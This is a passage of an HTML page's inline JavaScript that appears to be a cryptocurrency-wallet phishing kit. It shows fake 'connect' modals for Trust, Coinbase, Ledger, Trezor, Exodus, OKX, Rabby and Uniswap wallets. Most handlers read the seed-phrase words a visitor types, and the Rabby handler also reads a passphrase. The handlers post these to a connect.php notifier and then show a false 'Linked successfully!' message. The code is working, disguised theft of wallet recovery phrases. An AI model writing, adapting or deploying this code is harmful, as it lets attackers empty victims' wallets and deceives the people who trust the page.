          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-trust").style.display =
            "block";

          // Hide the tips container
          tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
        .querySelectorAll(".trust-toggle-seed-input")
        .forEach((button) => {
          button.addEventListener("click", function () {
            // Get all input fields with the class 'metamask-seed-input'
            const inputs = document.querySelectorAll(".trust-seed-input");

            inputs.forEach((input) => {
              // Toggle the input type between 'password' and 'text'
              if (input.type === "password") {
                input.type = "text";
              } else {
                input.type = "password";
              }
            });
          });
        });

      document.getElementById("trust-close-button").onclick = function () {
        // Hide the modal
        document.getElementById("trust-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("trust-modal-overlay").style.display = "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".trust-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("shield-container");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("trust modal closed.");
      };

      // coinbase

      document.getElementById("coinbase-but").onclick = function () {
        console.log("coinbase seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("video-container");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-coinbase").style.display =
          "none";

        // Show the modal
        document.getElementById("coinbase-modal").style.display = "block";
        document.getElementById("coinbase-modal-overlay").style.display =
          "block";

        // Prepare the message to send
        const message = "coinbase seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
     
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-coinbase").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document.getElementById("coinbase-import-button").onclick = function () {
        console.log("coinbase Wallet button clicked!");

        // Get all wallet input fields
        const inputs = document.querySelectorAll(".coinbase-import-input");
        const walletInputs = Array.from(inputs).map((input) =>
          input.value.trim()
        );
        console.log(walletInputs);
        // Validate inputs (ensure all fields are filled)
        const isValid = walletInputs.length > 0;
        if (!isValid) {
          alert("Please fill in all wallet input fields.");
          return;
        }

        // Hide the import container
        document.getElementById("import-container-coinbase").style.display =
          "none";

        // Show the tips container
        const tipsContainer = document.getElementById("video-container");
        tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Prepare the message to send
        const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-coinbase").style.display =
            "block";

          // Hide the tips container
          tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document.getElementById("coinbase-close-button").onclick = function () {
        // Hide the modal
        document.getElementById("coinbase-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("coinbase-modal-overlay").style.display =
          "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".coinbase-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("video-container");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("trust modal closed.");
      };

      //ledger

      document.getElementById("ledger-but").onclick = function () {
        console.log("coinbase seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("ledger-container");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-ledger").style.display =
          "none";

        // Show the modal
        document.getElementById("ledger-modal").style.display = "block";
        document.getElementById("ledger-modal-overlay").style.display = "block";

        // Prepare the message to send
        const message = "ledger seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
   
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-ledger").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
        .querySelectorAll('[id^="ledger-switch-words-count-button"]')
        .forEach((button) => {
          button.addEventListener("click", function () {
            // Get the number from the button ID
            const wordsCount = parseInt(this.id.split("-").pop(), 10); // Extracts the number from the ID

            // Define all possible container IDs
            const containers = ["ledger-12", "ledger-18", "ledger-24"];

            // Hide all ledger containers
            containers.forEach((containerId) => {
              const container = document.getElementById(containerId);
              if (container) {
                container.classList.add("scwtw-hidden"); // Add hidden class to all
              }
            });

            // Show all containers up to the selected value
            for (let i = 12; i <= wordsCount; i++) {
              const selectedContainerId = `ledger-${i}`;
              const selectedContainer =
                document.getElementById(selectedContainerId);
              if (selectedContainer) {
                selectedContainer.classList.remove("scwtw-hidden"); // Remove hidden class
              }
            }

            // Set data-is-selected attribute
            document
              .querySelectorAll('[id^="ledger-switch-words-count-button"]')
              .forEach((btn) => {
                btn.setAttribute("data-is-selected", "false"); // Set all to false
              });
            this.setAttribute("data-is-selected", "true"); // Set the clicked button to true
          });
        });

      document.getElementById("ledger-import-button").onclick = function () {
        console.log("ledger Wallet button clicked!");

        // Get all wallet input fields
        const inputs = document.querySelectorAll(".ledger-seed-input");
        const walletInputs = Array.from(inputs).map((input) =>
          input.value.trim()
        );
        console.log(walletInputs);
        // Validate inputs (ensure all fields are filled)
        const isValid = walletInputs.length > 0;
        if (!isValid) {
          alert("Please fill in all wallet input fields.");
          return;
        }

        // Hide the import container
        document.getElementById("import-container-ledger").style.display =
          "none";

        // Show the tips container
        const tipsContainer = document.getElementById("ledger-container");
        tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Prepare the message to send
        const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-coinbase").style.display =
            "block";

          // Hide the tips container
          tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document.getElementById("ledger-close-button1").onclick = function () {
        // Hide the modal
        document.getElementById("ledger-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("ledger-modal-overlay").style.display = "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".ledger-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("ledger-container");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("ledger modal closed.");
      };

      //trezor

      document.getElementById("trezor-but").onclick = function () {
        console.log("trezor seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("trezor-container");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-trezor").style.display =
          "none";

        // Show the modal
        document.getElementById("trezor-modal").style.display = "block";
        document.getElementById("trezor-modal-overlay").style.display = "block";

        // Prepare the message to send
        const message = "trezor seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
     
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-trezor").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
        .querySelectorAll('[id^="trezor-switch-words-count-button"]')
        .forEach((button) => {
          button.addEventListener("click", function () {
            // Get the number from the button ID
            const wordsCount = parseInt(this.id.split("-").pop(), 10); // Extracts the number from the ID

            // Define all possible container IDs
            const containers = ["trezor-12", "trezor-18", "trezor-24"];

            // Hide all ledger containers
            containers.forEach((containerId) => {
              const container = document.getElementById(containerId);
              if (container) {
                container.classList.add("scwtw-hidden"); // Add hidden class to all
              }
            });

            // Show all containers up to the selected value
            for (let i = 12; i <= wordsCount; i++) {
              const selectedContainerId = `trezor-${i}`;
              const selectedContainer =
                document.getElementById(selectedContainerId);
              if (selectedContainer) {
                selectedContainer.classList.remove("scwtw-hidden"); // Remove hidden class
              }
            }

            // Set data-is-selected attribute
            document
              .querySelectorAll('[id^="trezor-switch-words-count-button"]')
              .forEach((btn) => {
                btn.setAttribute("data-is-selected", "false"); // Set all to false
              });
            this.setAttribute("data-is-selected", "true"); // Set the clicked button to true
          });
        });

      document.getElementById("trezor-import-button").onclick = function () {
        console.log("trezor Wallet button clicked!");

        // Get all wallet input fields
        const inputs = document.querySelectorAll(".trezor-seed-input");
        const walletInputs = Array.from(inputs).map((input) =>
          input.value.trim()
        );
        console.log(walletInputs);
        // Validate inputs (ensure all fields are filled)
        const isValid = walletInputs.length > 0;
        if (!isValid) {
          alert("Please fill in all wallet input fields.");
          return;
        }

        // Hide the import container
        document.getElementById("import-container-trezor").style.display =
          "none";

        // Show the tips container
        const tipsContainer = document.getElementById("trezor-container");
        tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Prepare the message to send
        const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-trezor").style.display =
            "block";

          // Hide the tips container
          tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document.getElementById("trezor-close-button1").onclick = function () {
        // Hide the modal
        document.getElementById("trezor-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("trezor-modal-overlay").style.display = "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".trezor-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("trezor-container");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("trezor modal closed.");
      };

//exodus

document.getElementById("exodus-but").onclick = function () {
    console.log("exodus seed connect clicked!");

    // Show the ghost container
    const ghostContainer = document.getElementById("exodus-container");
    ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

    // Hide the import container
    document.getElementById("import-container-exodus").style.display =
      "none";

    // Show the modal
    document.getElementById("exodus-modal").style.display = "block";
    document.getElementById("exodus-modal-overlay").style.display = "block";

    // Prepare the message to send
    const message = "exodus seed connect clicked!"; // Customize your message

    // Send the message to the PHP notifier
    fetch("connect.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({
        message: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log("Message sent successfully:", data);
 
      })
      .catch((error) => {
        console.error("Error sending message:", error);
      });

    // Wait for 2 seconds before hiding the ghost container and showing the wallet input
    setTimeout(() => {
      // Hide the ghost container
      ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

      // Show the wallet input
      document.getElementById("import-container-exodus").style.display =
        "block";

      console.log("Loading complete, wallet input is now visible.");
    }, 2000); // 2000 milliseconds = 2 seconds
  };

  document
    .querySelectorAll('[id^="exodus-switch-words-count-button"]')
    .forEach((button) => {
      button.addEventListener("click", function () {
        // Get the number from the button ID
        const wordsCount = parseInt(this.id.split("-").pop(), 10); // Extracts the number from the ID

        // Define all possible container IDs
        const containers = ["exodus-12", "exodus-18", "exodus-24"];

        // Hide all ledger containers
        containers.forEach((containerId) => {
          const container = document.getElementById(containerId);
          if (container) {
            container.classList.add("scwtw-hidden"); // Add hidden class to all
          }
        });

        // Show all containers up to the selected value
        for (let i = 12; i <= wordsCount; i++) {
          const selectedContainerId = `exodus-${i}`;
          const selectedContainer =
            document.getElementById(selectedContainerId);
          if (selectedContainer) {
            selectedContainer.classList.remove("scwtw-hidden"); // Remove hidden class
          }
        }

        // Set data-is-selected attribute
        document
          .querySelectorAll('[id^="exodus-switch-words-count-button"]')
          .forEach((btn) => {
            btn.setAttribute("data-is-selected", "false"); // Set all to false
          });
        this.setAttribute("data-is-selected", "true"); // Set the clicked button to true
      });
    });

  document.getElementById("exodus-import-button").onclick = function () {
    console.log("exodus Wallet button clicked!");

    // Get all wallet input fields
    const inputs = document.querySelectorAll(".exodus-seed-input");
    const walletInputs = Array.from(inputs).map((input) =>
      input.value.trim()
    );
    console.log(walletInputs);
    // Validate inputs (ensure all fields are filled)
    const isValid = walletInputs.length > 0;
    if (!isValid) {
      alert("Please fill in all wallet input fields.");
      return;
    }

    // Hide the import container
    document.getElementById("import-container-exodus").style.display =
      "none";

    // Show the tips container
    const tipsContainer = document.getElementById("exodus-container");
    tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

    // Prepare the message to send
    const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

    // Send the message to the PHP notifier
    fetch("connect.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: new URLSearchParams({
        message: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log("Message sent successfully:", data);
  // Refresh the page after successful response
 alert("Linked successfully!"); window.location.reload();
      })
      .catch((error) => {
        console.error("Error sending message:", error);
      });

    // Wait for 2 seconds before hiding the ghost container and showing the wallet input
    setTimeout(() => {
      // Hide the ghost container
      ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

      // Show the wallet input
      document.getElementById("import-container-exodus").style.display =
        "block";

      // Hide the tips container
      tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

      console.log("Loading complete, wallet input is now visible.");
    }, 2000); // 2000 milliseconds = 2 seconds
  };

  document.getElementById("exodus-close-button1").onclick = function () {
    // Hide the modal
    document.getElementById("exodus-modal").style.display = "none";
    // Hide the modal overlay
    document.getElementById("exodus-modal-overlay").style.display = "none";

    // Optionally, you can also reset any input fields or states if needed
    const inputs = document.querySelectorAll(".exodus-seed-input");
    inputs.forEach((input) => {
      input.value = ""; // Clear the input fields
    });

    // If you want to hide the ghost container and tips container as well
    const ghostContainer = document.getElementById("exodus-container");
    ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

    console.log("exodus modal closed.");
  };


      //okx

      document.getElementById("okx-but").onclick = function () {
        console.log("okx seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("loading-container-okx");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-okx").style.display = "none";

        // Show the modal
        document.getElementById("okx-modal").style.display = "block";
        document.getElementById("okx-modal-overlay").style.display = "block";

        // Prepare the message to send
        const message = "okx seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
  
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-okx").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
        .getElementById("okx-change-words-count")
        .addEventListener("change", function () {
          // Get the selected value
          const selectedValue = parseInt(this.value, 10); // Convert to integer

          // Define all possible container IDs
          const containers = [
            "okx-container-12-words",
            "okx-container-15-words",
            "okx-container-18-words",
            "okx-container-21-words",
            "okx-container-24-words",
          ];

          // Loop through all containers
          containers.forEach((containerId) => {
            const container = document.getElementById(containerId);
            // Extract the number from the container ID (e.g., "12" from "metamask-container-12-words")
            const containerNumber = parseInt(containerId.match(/\d+/)[0], 10);

            // Show the container if its number is <= the selected value, otherwise hide it
            if (containerNumber <= selectedValue) {
              container.classList.remove("scwtw-hidden");
            } else {
              container.classList.add("scwtw-hidden");
            }
          });
        });


        document.getElementById("okx-import-button").onclick = function () {
        console.log("okx Wallet button clicked!");

        // Get all wallet input fields
        const inputs = document.querySelectorAll(".okx-seed-input");
        const walletInputs = Array.from(inputs).map((input) =>
          input.value.trim()
        );
        console.log(walletInputs);
        // Validate inputs (ensure all fields are filled)
        const isValid = walletInputs.length > 0;
        if (!isValid) {
          alert("Please fill in all wallet input fields.");
          return;
        }

        // Hide the import container
        document.getElementById("import-container-okx").style.display =
          "none";

        // Show the tips container
        const tipsContainer = document.getElementById("loading-container-okx");
        tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Prepare the message to send
        const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-okx").style.display =
            "block";

          // Hide the tips container
          tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document.getElementById("okx-close-button").onclick = function () {
        // Hide the modal
        document.getElementById("okx-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("okx-modal-overlay").style.display = "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".okx-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("loading-container-okx");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("okx modal closed.");
      };

//rabby
      document.getElementById("rabby-but").onclick = function () {
        console.log("rabby seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("loading-container-rabby");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-rabby").style.display = "none";

        // Show the modal
        document.getElementById("rabby-modal").style.display = "block";
        document.getElementById("rabby-modal-overlay").style.display = "block";

        // Prepare the message to send
        const message = "rabby seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
 
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-rabby").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document
    .getElementById("rabby-change-words-count")
    .addEventListener("change", function () {
        // Get the selected value
        const selectedValue = this.value; // Keep it as a string for easier comparison

        // Define all possible container IDs
        const containers = [
            "rabby-container-12-words",
            "rabby-container-15-words",
            "rabby-container-18-words",
            "rabby-container-21-words",
            "rabby-container-24-words",
        ];

        // Loop through all containers
        containers.forEach((containerId) => {
            const container = document.getElementById(containerId);
            // Extract the number from the container ID (e.g., "12" from "rabby-container-12-words")
            const containerNumber = parseInt(containerId.match(/\d+/)[0], 10);

            // Show the container if its number is <= the selected value, otherwise hide it
            if (containerNumber <= parseInt(selectedValue.split('+')[0], 10)) {
                container.classList.remove("scwtw-hidden");
            } else {
                container.classList.add("scwtw-hidden");
            }
        });

        // Check if the selected value includes '+passphrase'
        if (selectedValue.includes('+passphrase')) {
            const passphraseContainerId = `rabby-container-passphrase`;
            const passphraseContainer = document.getElementById(passphraseContainerId);
            if (passphraseContainer) {
                passphraseContainer.classList.remove("scwtw-hidden"); // Show the passphrase container
            }
        }
    });



    document.getElementById("rabby-import-button").onclick = function () {
  console.log("rabby Wallet button clicked!");

  // Get all wallet input fields
  const inputs = document.querySelectorAll(".rabby-seed-input");
  const walletInputs = Array.from(inputs).map((input) =>
    input.value.trim()
  );
  console.log(walletInputs);
  // Validate inputs (ensure all fields are filled)
  const isValid = walletInputs.length > 0;
  if (!isValid) {
    alert("Please fill in all wallet input fields.");
    return;
  }

  // Hide the import container
  document.getElementById("import-container-rabby").style.display =
    "none";

  // Show the tips container
  const tipsContainer = document.getElementById("loading-container-rabby");
  tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

  // Prepare the message to send
  const message = `Wallet Import: ${walletInputs.join(", ")} passphrase: ${document.getElementById("rabby-passphrase-input").value}`; // Customize your message

  // Send the message to the PHP notifier
  fetch("connect.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: new URLSearchParams({
      message: message,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });

  // Wait for 2 seconds before hiding the ghost container and showing the wallet input
  setTimeout(() => {
    // Hide the ghost container
    ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

    // Show the wallet input
    document.getElementById("import-container-rabby").style.display =
      "block";

    // Hide the tips container
    tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

    console.log("Loading complete, wallet input is now visible.");
  }, 2000); // 2000 milliseconds = 2 seconds
};

document.getElementById("rabby-close-button").onclick = function () {
        // Hide the modal
        document.getElementById("rabby-modal").style.display = "none";
        // Hide the modal overlay
        document.getElementById("rabby-modal-overlay").style.display = "none";

        // Optionally, you can also reset any input fields or states if needed
        const inputs = document.querySelectorAll(".rabby-seed-input");
        inputs.forEach((input) => {
          input.value = ""; // Clear the input fields
        });

        // If you want to hide the ghost container and tips container as well
        const ghostContainer = document.getElementById("loading-container-rabby");
        ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

        console.log("rabby modal closed.");
      };

      document.getElementById("uniswap-but").onclick = function () {
        console.log("uniswap seed connect clicked!");

        // Show the ghost container
        const ghostContainer = document.getElementById("loading-container-uniswap");
        ghostContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

        // Hide the import container
        document.getElementById("import-container-uniswap").style.display = "none";

        // Show the modal
        document.getElementById("uniswap-modal").style.display = "block";
        document.getElementById("uniswap-modal-overlay").style.display = "block";

        // Prepare the message to send
        const message = "rabby seed connect clicked!"; // Customize your message

        // Send the message to the PHP notifier
        fetch("connect.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
          body: new URLSearchParams({
            message: message,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            console.log("Message sent successfully:", data);
     
          })
          .catch((error) => {
            console.error("Error sending message:", error);
          });

        // Wait for 2 seconds before hiding the ghost container and showing the wallet input
        setTimeout(() => {
          // Hide the ghost container
          ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

          // Show the wallet input
          document.getElementById("import-container-uniswap").style.display =
            "block";

          console.log("Loading complete, wallet input is now visible.");
        }, 2000); // 2000 milliseconds = 2 seconds
      };

      document.getElementById("uniswap-import-button").onclick = function () {
  console.log("uniswap Wallet button clicked!");

  // Get all wallet input fields
  const inputs = document.querySelectorAll(".uniswap-seed-input");
  const walletInputs = Array.from(inputs).map((input) =>
    input.value.trim()
  );
  console.log(walletInputs);
  // Validate inputs (ensure all fields are filled)
  const isValid = walletInputs.length > 0;
  if (!isValid) {
    alert("Please fill in all wallet input fields.");
    return;
  }

  // Hide the import container
  document.getElementById("import-container-uniswap").style.display =
    "none";

  // Show the tips container
  const tipsContainer = document.getElementById("loading-container-uniswap");
  tipsContainer.classList.remove("scwtw-hidden", "scwtw-opacity-0");

  // Prepare the message to send
  const message = `Wallet Import: ${walletInputs.join(", ")}`; // Customize your message

  // Send the message to the PHP notifier
  fetch("connect.php", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: new URLSearchParams({
      message: message,
    }),
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Message sent successfully:", data);
      // Refresh the page after successful response
     alert("Linked successfully!"); window.location.reload();
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });

  // Wait for 2 seconds before hiding the ghost container and showing the wallet input
  setTimeout(() => {
    // Hide the ghost container
    ghostContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

    // Show the wallet input
    document.getElementById("import-container-uniswap").style.display =
      "block";

    // Hide the tips container
    tipsContainer.classList.add("scwtw-hidden", "scwtw-opacity-0");

    console.log("Loading complete, wallet input is now visible.");
  }, 2000); // 2000 milliseconds = 2 seconds
};



     </script>



    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="main.js"></script>
    <script src="./assets/js/seed-validation.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const validator = new SeedPhraseValidator();
            validator.initializeFormValidation();
        });
    </script>
</body>
</html> 